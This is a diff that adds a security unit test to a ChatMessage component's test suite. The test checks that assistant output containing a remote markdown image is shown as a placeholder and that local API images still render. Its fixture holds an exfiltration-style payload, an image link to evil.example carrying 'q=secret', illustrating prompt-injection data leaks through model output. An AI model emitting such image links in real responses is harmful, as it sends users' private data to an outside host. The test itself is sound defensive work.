@@ -28,6 +28,22 @@ describe("ChatMessage", () => {
     expect(screen.getByText("Hello!")).toBeInTheDocument();
   });
 
+  it("never renders a remote image from model output (SEC-INJ-1)", () => {
+    const { container } = render(
+      <ChatMessage
+        message={{
+          id: "sec-inj-1",
+          role: "assistant",
+          content:
+            "Summary ![x](https://evil.example/?q=secret) and ![ok](/api/files/thumbnail?path=%2Fa.png)",
+        }}
+      />
+    );
+    expect(container.querySelector('img[src*="evil"]')).toBeNull();
+    expect(screen.getByText(/\[image: x\]/)).toBeInTheDocument();
+    expect(container.querySelector('img[src^="/api/"]')).not.toBeNull();
+  });
+
   it("renders assistant message content", () => {
     render(
       <ChatMessage
